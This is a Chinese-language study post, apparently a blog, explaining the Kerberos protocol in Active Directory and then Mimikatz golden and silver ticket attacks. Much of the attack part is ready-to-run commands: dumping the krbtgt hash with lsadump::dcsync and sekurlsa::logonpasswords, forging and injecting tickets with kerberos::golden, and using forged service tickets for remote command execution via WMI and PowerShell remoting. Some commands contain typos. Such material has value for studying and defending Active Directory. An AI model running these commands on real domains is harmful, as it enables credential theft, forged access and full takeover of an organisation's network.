class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line">kerberons协议理解：</span><br><span class="line">Kerberos是windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份验证。相互认证或请求服务的实体被称为委托人(Principal)。参与的中央服务器被称为发布中心（简称KDC）。KDC有两个服务组成：身份验证服务（Authentication Server 简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。在windows域环境下，身份验证服务和票据授予服务可同时运行在任何可写域控服务器上。</span><br><span class="line"></span><br><span class="line">委托人（Principal）是一个具有唯一标识的实体，可以是一台计算机或一项服务，通过使用KDC颁发的票据来进行通信。委托人可以分为两类：用户和服务，分别具有不同种类的标识符。用户通过&quot;user@REALM&quot;格式的用户主体名称（User Principal Name,简称UPN来标识）。记住REALM一定是大写的。例如用户&quot;bob&quot;在&quot;bhusa.com&quot;域中应该表示为bob@BHUSA.com</span><br><span class="line"></span><br><span class="line">服务主题名称（Service Principal Name，简称SPN）是用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。例如，主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;,&quot;ldap/dc1&quot;和&quot;ldcap/dc1.bhusa.com/bhusa.com&quot;。参考全限定主机名和仅主机名，应该服务可能注册多个SPN</span><br><span class="line"></span><br><span class="line">同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么微软Kerberos环境中的一个必要租件。查询服务&quot;规范化&quot;名称，然后生成请求服务的SPN。</span><br><span class="line"></span><br><span class="line">用户要访问活动目录中的一项服务访问需经过以下几个步骤</span><br><span class="line">1.客户端对用户口令执行散列运算(hash)。此hash值（即用户密钥）成为客户端和KDC共享的长期密钥（long term key）</span><br><span class="line">2.KRB_AS_REQ-客户端加密一个时间戳，然后发送给身份验证服务</span><br><span class="line">3.KRB_AS_REP-身份验证服务会解密时间戳，若解密成功，表明了客户端获得某个特定用户的口令（即验证了用户的身份）</span><br><span class="line">①短期会话密钥，用于客户端向KDC发起后续的请求，该消息经客户端的长期密钥加密。（此短期会话密钥仅适用于该客户端和KDC之间）</span><br><span class="line">②票据授予票据（Ticket Granting Ticket，简称TGT），包含有关用户名、域名、时间和组成员资格等信息。该消息经仅可知KDC的密钥加密（在Windows环境中为krbtgt账户的NT-Hash）。记住KDC不记录状态：客户端每次请求访问一项服务时，TGT都会被转发。</span><br><span class="line">4.KRB_TGS_REQ-客户端使用AS返回的会话密钥构建访问特定服务的请求。客户端把TGT连同请求一起发送到票据授予服务</span><br><span class="line">5.KRB_TGS_REP-票据授予服务向客户端发送一个服务票据（Service Ticket，简称ST），包括两个部分</span><br><span class="line">*1远程服务器的部分-包括请求用户的组员资格，时间戳，用于客户端和远程服务器之间通信的会话密钥。使用远程服务器和</span><br><span class="line">KDC共享的长期密钥加密这部分消息</span><br><span class="line">*2.客户端的部分-包含用于客户端和远程服务器之间通信的会话密钥。使用步骤3中AS回复的短期会话密钥加密这部分消息</span><br><span class="line">6.KRB_TGS_REQ-客户端把服务票据中的服务器部分和请求一起发送到远程服务器。远程服务器将直接接受该服务器票据，并不需要和KDC直接通信，因为该票据是用远程服务器和KDC共享的长期密钥加密过。解密成功即成功表名KDC已经允许了此次通信。</span><br><span class="line"></span><br><span class="line">自己理解：</span><br><span class="line">A为客户端（Principal），B为服务端</span><br><span class="line">A要登陆B，A必须有B的用户。</span><br><span class="line">A在登陆B的界面输入了用户名和明文密码Administrator/123456。A在发送请求之前会把B用户口令进行hash运算。如果验证通过，这个hash值会成为A和B通信的长期密钥。</span><br><span class="line">进行hash运算后，A会加密一个时间戳。然后发送给身份验证服务（AS）</span><br><span class="line">然后AS会解密时间戳，如果解密成功，表示A成功验证了用户的身份。然后AS会返回会话密钥构建的信息要求A访问特定服务的请求</span><br><span class="line">A会把TGT连同请求一同发送到TGS，TGS收到后会把ST发送回给B</span><br><span class="line">B收到TGS发回来的票据后，A使用票据和请求推送到远程服务器。远程服务器将直接接受该票据。</span><br><span class="line">然后A成功登陆到B</span><br><span class="line"></span><br><span class="line">通俗理解：</span><br><span class="line">你面前有一道门，门后面有钱。要通过这道门你必须要有门的钥匙，当把钥匙插入到锁里面的时候。钥匙会和锁芯进行配对，如果配对成功就会返回咔的一声。代表你能扭动钥匙解锁这把锁，如果钥匙和锁芯对不上钥匙就会被弹出来。当你扭动钥匙的时候，就代表身份验证已经通过你正在开这把锁。当这把锁被开了后你就成功拿到门后面的钱</span><br><span class="line"></span><br><span class="line">关于krbtgt账户和TGT的问题</span><br><span class="line"></span><br><span class="line">1. 问题一：微软对长期密钥的散列值不加SALT</span><br><span class="line"></span><br><span class="line">微软实现的Kerberos版本对MIT原始版本中的一个关键函数做了修改，最终降低了底层的安全性。在MIT原始版本中，首先在明文口令中添加字符串username@DOMAIN.COM，然后经过散列运算生成长期密钥。使用用户名给密码加盐，能够为碰巧密码相同的不同用户生成不同的散列值。只要涉及到密钥的操作，仍然需要使用实际的口令。</span><br><span class="line"></span><br><span class="line">在微软实现版本中，口令转换成Unicode格式，再经过MD4运算生成没有加盐的密钥。这种情况也被称为NT-Hash，和微软十多年来存储长度大于14字符的密码的格式一样。缺少salt意味着任何需要密钥的操作能够直接地使用密码的散列版本，而不是使用实际的密码。这听上去像大家耳熟能详的“pass-the-hash”攻击的根本原因。</span><br><span class="line"></span><br><span class="line">从一个攻击者的角度出发，如果能够提取该域的密码散列值，也就可以利用KRBTGT散列值来伪造TGT。虽然提取散列值看似难以实现，然而实际上，大部分渗透人员认为在普通的企业环境中这并不是一件困难的事情。我们会在白皮书下面的一个章节中作全面深入的解析。</span><br><span class="line"></span><br><span class="line">利用思路</span><br><span class="line"></span><br><span class="line">在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。这种特别的攻击方法被称为“pass-the-ticket”攻击。</span><br><span class="line"></span><br><span class="line">所谓的票据攻击就是伪造票据</span><br><span class="line"></span><br><span class="line">客户端的有效性</span><br><span class="line"></span><br><span class="line">由于Kerberos是无状态的，TGT必须包含了同票据授予服务交互所需的全部信息。根据微软实现的Kerberos协议扩展（MS-KILE），KDC负责设置TGT中相应的标志位，而票据授予服务使用这些标志位来颁发服务票据。默认情况下，TGT携带了有关用户的组成员资格、票据所使用的加密类型以及票据的有效期等信息。此外，微软使用TGT来加强域上传统的和最新的身份认证策略。TGT包含一些传统的值来限制账户，例如登录时长、账户是否禁用、账户是否过期、密码失效的时间戳。</span><br><span class="line"></span><br><span class="line">万能票据（Golden Ticket）</span><br><span class="line"></span><br><span class="line">综上所述，微软实现的Kerberos版本中存在的一系列问题所引发的后果是：Kerberos成为了攻击者实施Post-Exploitation的游乐场。如果攻击者能够攻陷KDC和提取KRBTGT散列值。然后利用这些有限信息，攻击者能够为委托人生成任意的TGT。Mimikatz工具把这种特性称之为“万能票据”（golden ticket，直译为“黄金票据”，为突出功能上的特点，意译译为“万能票据”）。万能票据拥有一些有趣的属性，会导致传统企业域中一些严重的安全问题。</span><br><span class="line"></span><br><span class="line">首先，万能票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息，然后处理TGT并颁发服务票据。内存中插入万能票据并不需要提升权限。而且默认情况下，万能票据的有效期是10年。</span><br><span class="line"></span><br><span class="line">其次，万能票据可以用来绕过当前Kerberos有关加密策略的要求。例如，可以使用DES或RC4加密算法创建一个TGT，即使该域明确支持AES，禁止使用DES或RC4。此情况会产生一个有趣的现象：TGT使用DES加密而服务票据使用AES加密。票据授予服务似乎并不担心TGT，也不拒绝异常行为，因为没有机制让票据授予服务报告关于策略的错误。</span><br><span class="line"></span><br><span class="line">再次，万能票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求，以确保已禁用的TGT不能用于获得服务票据。然而，该功能的实现存在问题。只有当TGT的寿命超过20分钟时，票据授予服务才会验证TGT的有效性。如果TGT的寿命低于20分钟，票据授予服务将直接颁发服务票据，而不去验证TGT的有效性，默认情况下服务票据具有10小时的有效期。因为攻击者可以利用Mimikatz工具随心所欲的产生票据，所以攻击者只需清除旧的TGT，再替换为寿命少于20分钟的新票据，轻松突破20分钟的限制条件。</span><br><span class="line"></span><br><span class="line">最终，万能票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据，票据中任何用户都可以是任意组的成员。这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。万能票据中的用户和SID不必在活动目录中真实存在。也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</span><br><span class="line"></span><br><span class="line">归根结底，在一个企业的活动目录的环境中，如果KRBTGT账户的丢失，也就意味着环境中的信任关系完全丧失。考虑到攻击者可以生成任意的Kerberos票据，能绕过对任意用户的账户策略，能够让用户成为任意组的成员，所以攻击者简直可以横行无阻。此外，鉴于KRBTGT账户极少更改散列值，攻击者可以在较长的时间内使用这些伪造的票据</span><br><span class="line"></span><br><span class="line">创建“万能票据”的所需条件：</span><br><span class="line">视频：https://www.youtube.com/watch?v=eNbujcPn5c4</span><br><span class="line">①krbtgt账户的NT-Hash：该散列值是用于Kerberos的秘密密钥，仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限；（域管理员权限）</span><br><span class="line">②域账户名称：通常是域管理员“domain admin”；</span><br><span class="line">③域名称；</span><br><span class="line">④域SID：可以从域用户的SID或通过sysinternal中psGetsid.exe获得；</span><br><span class="line"></span><br><span class="line">黄金票据是伪造票据授权授权票据（TGT）</span><br><span class="line"></span><br><span class="line">黄金票据的局限性：</span><br><span class="line">黄金票据欺骗了当前域的管理权限，当KRBTGT账户密码哈希显示在作为多域AD的林一部分的子域中时存在局限性。因为是root域包含全森林管理组。由于Mimikatz通过相对标识符（RID）向票据添加了组成员资格，因此Kerberos票据中的企业管理RID在其创建的域中（基于KRBTGT账户域）被标识为本地。如果通过获取域SID和附加RID创建的域安全标识符(SID)不存在,那么Kerberons票据的持有者不会收到该级别的访问权限。换句话说，在一个多域AD森林中，如果创建的GT（黄金票据）域不包含Enterprise Admins组，则GT不会向森林中其他域提供管理权限。在单个域控AD林中不存在局限性。换句话说，黄金票据在多个AD（域控中）受到只有一个域控的完全控制权限。而在单个AD（域控中）无局限性。</span><br><span class="line"></span><br><span class="line">绕过黄金票据的局限性</span><br><span class="line">在迁移方案中，从DomainA迁到DomainB的用户将原始DomainA用户SID值添加到DomainB的SID History属性中。当用户使用新用户登陆DomainB时，DomainA SID将与确定访问DomainB用户组一起验证。这意味着可以将SID添加到SID历史记录以扩展访问。一旦Mimikatz支持Golden和（Silver Tickets）中的SID History，事情会变的更加有趣，因为AD Forest中的任何组都可以被包含并且用于授权访问。使用最新版本的Mimikatz，我们现在可以将SID历史记录添加到Forest Enterpise Admin组的Golden Ticket中。一旦单个域名的KRBTGT账户密码哈希被捕获到时，通过黄金票据可以伪造用户登陆到整个森林中。</span><br><span class="line"></span><br><span class="line">使用Mimikatz伪造Kerberons黄金票据</span><br><span class="line">kerberos::golden  /admin:ADMIINACCOUNTNAME  /domain:DOMAINFQDN /id:ACCOUNTRID  /sid:DOMAINSID  /krbtgt:KRBTGTPASSWORDHASH  /ptt</span><br><span class="line">生成hash值</span><br><span class="line">命令例子：kerberos::golden  /admin:darthvader  /domain:lab.adsercurity.org /id:2601  /sid: S-1-5-21-4155807533-921486164-2767329826 /krbtgt:8a2f1adcdd519a23515780021d2d178a  /ptt</span><br><span class="line"></span><br><span class="line">导出hash</span><br><span class="line">mimikatz log  &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;</span><br><span class="line">找到如下信息：</span><br><span class="line">/domain：test.local</span><br><span class="line">/sid:S-1-5-21-4155807533-921486164-2767329826</span><br><span class="line">/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f</span><br><span class="line">2、生成Golden Ticket</span><br><span class="line">伪造的用户设置为god,执行:</span><br><span class="line">mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826</span><br><span class="line">/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god</span><br><span class="line">/ticket:gold.kirbi&quot;</span><br><span class="line">生成文件gold.kirbi</span><br><span class="line">3、伪造Golden Ticket获得域控权限</span><br><span class="line">导入Golden Ticket，执行如下命令：</span><br><span class="line">kerberos::ptt c:\test\gold.kirbi</span><br><span class="line">/domain -----完整的域名，在这个例子中：“lab.adsecurity.org”</span><br><span class="line">/ sid ----域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”</span><br><span class="line">/ sids --- AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。? </span><br><span class="line"> / user ---伪造的用户名</span><br><span class="line">/groups（可选）---用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。</span><br><span class="line">/ krbtgt---域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。</span><br><span class="line">/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。</span><br><span class="line">/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。</span><br><span class="line">/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。</span><br><span class="line">/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。</span><br><span class="line">/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</span><br><span class="line">/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</span><br><span class="line">/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。</span><br><span class="line">/ aes128 - AES128密钥</span><br><span class="line">/ aes256 - AES256密钥</span><br><span class="line">黄金票默认组：</span><br><span class="line">域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513</span><br><span class="line">域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512</span><br><span class="line">架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518</span><br><span class="line">企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</span><br><span class="line">组策略创建者所有者SID：S-1-5-21 &lt;DOMAINID&gt; -520</span><br><span class="line">命令格式如下：</span><br><span class="line">kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</span><br><span class="line"></span><br><span class="line">命令示例：</span><br><span class="line"></span><br><span class="line">.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit</span><br><span class="line">参考文章：https://www.cnblogs.com/backlion/p/8127868.html</span><br><span class="line"></span><br><span class="line">白银票据：</span><br><span class="line">0x00介绍</span><br><span class="line">白银票据是伪造Kerberons票证授予服务（TGS）的票，也称为服务票据。白银票据与环境票据不一样的是，白银票据没有与域控进行通信，白银票据只能单一访问某个服务。</span><br><span class="line"></span><br><span class="line">0x01特点</span><br><span class="line">1.白银票据是一个有效的票据授予服务（TGS），因为Kerberons验证服务运行的每台服务器都对服务器主体名称的服务账户进行加密签名</span><br><span class="line">2.黄金票据是伪造TGT并且获得任何Kerberons服务，而白银票据是伪造（TGS）Kerberons票据，这意味着白银票据仅限于特定服务器上的任何服务</span><br><span class="line">3.大多数服务不验证PAC（通过将PAC校验和发送到域控进行PAC验证），因此使用服务账户密码哈希生成有效TGS可以完全伪造PAC</span><br><span class="line">4.攻击者需要服务账户密码哈希值</span><br><span class="line">5.TGS是伪造的，所有没有和TGT通信，这意味着DC验证过</span><br><span class="line">6.任何事件日志都在目标服务器上</span><br><span class="line"></span><br><span class="line">0x02要求</span><br><span class="line">1.域名</span><br><span class="line">2.域的SID</span><br><span class="line">3.域用户</span><br><span class="line">4.目标服务器的域名全称，此处为域控的全称</span><br><span class="line">5.用户ID（可选，管理员ID为500）</span><br><span class="line">6.运行在目标服务器上的kerberons服务，入mssql，http，cifs</span><br><span class="line">7.服务的NTLM散列（计算机用户或用户账户）</span><br><span class="line"></span><br><span class="line">命令例子：kerberons::golden /user:Haqksd /domain:haq.com /sid:S-1-5-21-2289215397-288801521-4019949533-1000  /tarfet:yk.haq.com /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /pt</span><br><span class="line"></span><br><span class="line">0x03引用文章的具体例子</span><br><span class="line">文章地址：https://www.cnblogs.com/backlion/p/8119013.html</span><br><span class="line">/domain –完整的域名称，如：lab.adsecurity.org</span><br><span class="line"></span><br><span class="line">/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127</span><br><span class="line"></span><br><span class="line">/user – 域用户名</span><br><span class="line"></span><br><span class="line">/ groups（可选） - 用户所属的组RID</span><br><span class="line"></span><br><span class="line">/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用</span><br><span class="line"></span><br><span class="line"> /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。</span><br><span class="line"></span><br><span class="line">/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）</span><br><span class="line"></span><br><span class="line">/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0</span><br><span class="line"></span><br><span class="line">/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时</span><br><span class="line"></span><br><span class="line">/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天</span><br><span class="line"></span><br><span class="line">1.白银票据需要的参数</span><br><span class="line">/target –目标服务器的FQDN</span><br><span class="line"></span><br><span class="line">FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）</span><br><span class="line"></span><br><span class="line">/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等</span><br><span class="line"></span><br><span class="line">/rc4 –服务的NTLM散列（计算机帐户或用户帐户）</span><br><span class="line"></span><br><span class="line">2.白银票据默认组</span><br><span class="line">域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513</span><br><span class="line"></span><br><span class="line">域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512</span><br><span class="line"></span><br><span class="line">架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518</span><br><span class="line"></span><br><span class="line">企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519</span><br><span class="line"></span><br><span class="line">组策略创建所有者SID：S-1-5-21 &lt;DOMAINID&gt; -520</span><br><span class="line"></span><br><span class="line">3. Mimikatz命令创建白银票据</span><br><span class="line">以下Mimikatz命令会在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建白银票据。为了成功创建Silver Ticket，需要从AD域转储中或在本地系统上运行Mimikatz来获获取adsmswin2k8r2.lab.adsecurity.org中AD计算机帐户密码哈希值。NTLM密码哈希与 rc4参数一起使用。服务SPN类型也需要在/ service参数中标识。目标计算机的FQDA需要在/ target参数中使用以及/ sid参数中的域SID。命令如下：</span><br><span class="line"></span><br><span class="line">mimikatz “kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">0x05 白银票据在各种服务中的实列</span><br><span class="line">  1.白银票据的服务列表</span><br><span class="line"> Service Type Service Silver Tickets</span><br><span class="line">WMI HOST</span><br><span class="line">RPCSS</span><br><span class="line">PowerShell Remoting</span><br><span class="line"></span><br><span class="line"> HOST</span><br><span class="line">HTTP</span><br><span class="line">WinRM HOST</span><br><span class="line">HTTP</span><br><span class="line">Scheduled Tasks HOST</span><br><span class="line"> Windows File Share (CIFS) CIFS</span><br><span class="line"> LDAP operations including</span><br><span class="line"></span><br><span class="line">Mimikatz DCSync</span><br><span class="line"></span><br><span class="line"> LDAP</span><br><span class="line"> Windows Remote Server Administration Tools RPCSS</span><br><span class="line">LDAP</span><br><span class="line">CIFS</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">2.Windows共享（CIFS）管理访问的银票</span><br><span class="line">为“ cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</span><br><span class="line"></span><br><span class="line">注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</span><br><span class="line"></span><br><span class="line">c $共享，我们能够将文件拷贝到共享文件中。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 3.具有管理员权限的Windows计算机（HOST）白银票据</span><br><span class="line">创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">利用HOST Silver Ticket，我们可以创建一个新的计划任务。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">或者通过利用HOST Silver Ticket，我们可以修改存在的计划任务。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> 4.Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</span><br><span class="line">为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 5.白银票据证连接到具有管理员权限Windows计算机上的LDAP</span><br><span class="line">为“ ldap ”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注：lsadump::dcsync</span><br><span class="line"></span><br><span class="line">向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</span><br><span class="line"></span><br><span class="line"> 6.白银票据证连接到具有管理员权限Windows计算机上的WMI</span><br><span class="line"> 为“ HOST ”服务和“ rpcss ”服务创建白银票据，以使用WMI在目标系统上远程执行命令。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Invoke-WmiMethod win32_process -ComputerName $ Computer -Credential $ Creds -name create -argumentlist“$ RunCommand”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  7.访问域控上“cifs”服务实列</span><br><span class="line">首先需要获得如下信息：</span><br><span class="line"></span><br><span class="line">/domain</span><br><span class="line"></span><br><span class="line">/sid</span><br><span class="line"></span><br><span class="line">/target:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"></span><br><span class="line">/service：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"></span><br><span class="line">/rc4：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"></span><br><span class="line">/user：要伪造的用户名，此处可用silver测试</span><br><span class="line"></span><br><span class="line">在域控上执行如下命令来获取域控主机的本地管理员账户hash</span><br><span class="line"></span><br><span class="line">mimikatz log &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br><span class="line">如图:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> 